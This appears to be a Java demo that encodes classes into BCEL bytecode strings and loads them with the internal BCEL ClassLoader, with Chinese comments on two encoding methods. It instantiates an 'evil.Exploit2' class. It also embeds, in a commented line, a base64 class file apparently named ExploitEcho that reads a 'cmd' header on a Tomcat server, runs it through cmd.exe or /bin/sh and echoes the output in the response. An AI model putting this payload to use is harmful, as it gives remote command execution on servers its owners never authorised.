import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import evil.Exploit2;
import evil.Exploit3;

import java.util.Base64;

public class BCELClassLoaderDemo {

    /**
     * 生成BCEL格式的字节码，方法一：
     *   通过 Repository.lookupClass()将Class对象转化为表示Java字节码的对象JavaClass
     *   然后通过Utility.encode() 将Java字节码对象JavaClass转化为BCEL格式的字节码
     */
    public static String generateBcelCode1(Class clazz) throws Exception {
        JavaClass evilJavaClazz = Repository.lookupClass(clazz);
        String code = Utility.encode(evilJavaClazz.getBytes(), true);
        String bcelCode = "$$BCEL$$" + code;
        System.out.println("bcelcode=" + bcelCode);
        return bcelCode;
    }

    /**
     * 生成BCEL格式的字节码，方法二：
     *   将Java字节码直接传入Utility.encode() ，从而得到BCEL格式的字节码
     */
    public static String generateBcelCode2(String classBase64) throws Exception {
        byte[] codes = Base64.getDecoder().decode(classBase64);
        String code = Utility.encode(codes, true);
        String bcelCode = "$$BCEL$$" + code;
        System.out.println("bcelcode=" + bcelCode);
        return bcelCode;
    }

    public static void main(String[] args) {
        try {
            ClassLoader bcelClassLoader = new ClassLoader();
            String bcelCode = generateBcelCode1(Exploit2.class);
//            String bcelCode = generateBcelCode2("yv66vgAAADQA1woAHQBXCgBYAFkKAFgAWgoAHQBbCABcCgAbAF0KAF4AXwoAXgBgBwBhCgBYAGIIAGMKACAAZAgAZQgAZgcAZwgAaAgAaQcAagoAGwBrCABsCABtBwBuCwAWAG8LABYAcAgAcQgAcgcAcwoAGwB0BwB1CgB2AHcIAHgHAHkIAHoKACAAewgAfAkAJQB9BwB+CgAlAH8IAIAKAIEAggoAIACDCACECACFCACGCACHCACIBwCJBwCKCgAwAIsKADAAjAoAjQCOCgAvAI8IAJAKAC8AkQoALwCSCgAgAJMIAJQKABsAlQoAGwCWCACXBwCYCgAbAJkIAJoHAJsIAJwIAJ0HAJ4HAJ8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQcAnwcAoAcAoQcAogcAeQcAdQcAagcAbgcAowcAmwcAngEAClNvdXJjZUZpbGUBABBFeHBsb2l0RWNoby5qYXZhDABFAEYHAKIMAKQApQwApgCnDACoAKkBAAd0aHJlYWRzDACqAKsHAKEMAKwArQwArgCvAQATW0xqYXZhL2xhbmcvVGhyZWFkOwwAsACxAQAEZXhlYwwAsgCzAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MALQAqQEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5qYXZhL3V0aWwvTGlzdAwAtQC2DACuALcBAANyZXEBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwAuAC5AQAQamF2YS9sYW5nL09iamVjdAcAugwAuwC8AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwAvQC+AQAJc2V0U3RhdHVzDAC/AMABABFqYXZhL2xhbmcvSW50ZWdlcgwARQDBAQAHb3MubmFtZQcAwgwAwwDEDADFALEBAAZ3aW5kb3cBAAdjbWQuZXhlAQACL2MBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwARQDGDADHAMgHAMkMAMoAywwARQDMAQACXEEMAM0AzgwAzwCxDADQANEBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMANIA0wwA1ADVAQAIc2V0Qnl0ZXMBAAJbQgwA1gC5AQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtFeHBsb2l0RWNobwEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHaXNFbXB0eQEAAygpWgEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNz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");
            bcelClassLoader.loadClass(bcelCode).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
